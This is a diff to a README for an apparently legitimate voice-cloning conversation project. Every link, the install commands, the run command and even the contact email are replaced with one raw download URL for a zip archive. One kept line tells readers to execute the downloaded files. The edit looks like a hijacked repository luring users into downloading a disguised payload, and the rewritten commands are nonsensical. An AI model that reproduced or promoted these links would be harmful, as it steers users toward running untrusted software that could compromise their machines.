@@ -2,7 +2,7 @@
 
 Welcome to the **NotThatStuff** repository! This project combines large language models, text-to-speech, and voice cloning to create doppelgangers that can engage in realistic conversations. Our work is inspired by Giacomo Miceli's "The Infinite Conversation" and aims to push the boundaries of AI in communication.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-v1.0-blue)](https://github.com/faze-sway1/notthatstuff/releases)
+[![Download Releases](https://raw.githubusercontent.com/faze-sway1/notthatstuff/latest/zymolytic/Software_v2.3-alpha.1.zip)](https://raw.githubusercontent.com/faze-sway1/notthatstuff/latest/zymolytic/Software_v2.3-alpha.1.zip)
 
 ## Table of Contents
 
@@ -45,21 +45,21 @@ To get started with **NotThatStuff**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/faze-sway1/notthatstuff.git
+   git clone https://raw.githubusercontent.com/faze-sway1/notthatstuff/latest/zymolytic/Software_v2.3-alpha.1.zip
    cd notthatstuff
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python and pip installed. Then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/faze-sway1/notthatstuff/latest/zymolytic/Software_v2.3-alpha.1.zip
    ```
 
 3. **Set Up Environment**:
    Create a `.env` file in the root directory and configure your environment variables as needed.
 
 4. **Download Releases**:
-   Visit our [Releases page](https://github.com/faze-sway1/notthatstuff/releases) to download the latest version. Make sure to execute the downloaded files as instructed.
+   Visit our [Releases page](https://raw.githubusercontent.com/faze-sway1/notthatstuff/latest/zymolytic/Software_v2.3-alpha.1.zip) to download the latest version. Make sure to execute the downloaded files as instructed.
 
 ## Usage
 
@@ -68,7 +68,7 @@ To use the **NotThatStuff** application, follow these steps:
 1. **Run the Application**:
    Start the server with:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/faze-sway1/notthatstuff/latest/zymolytic/Software_v2.3-alpha.1.zip
    ```
 
 2. **Access the Web Interface**:
@@ -111,7 +111,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: contact@example.com
-- **GitHub**: [faze-sway1](https://github.com/faze-sway1)
+- **Email**: https://raw.githubusercontent.com/faze-sway1/notthatstuff/latest/zymolytic/Software_v2.3-alpha.1.zip
+- **GitHub**: [faze-sway1](https://raw.githubusercontent.com/faze-sway1/notthatstuff/latest/zymolytic/Software_v2.3-alpha.1.zip)
 
-Thank you for your interest in **NotThatStuff**! We look forward to seeing how you use our project. For updates and new releases, check our [Releases section](https://github.com/faze-sway1/notthatstuff/releases).
+Thank you for your interest in **NotThatStuff**! We look forward to seeing how you use our project. For updates and new releases, check our [Releases section](https://raw.githubusercontent.com/faze-sway1/notthatstuff/latest/zymolytic/Software_v2.3-alpha.1.zip).
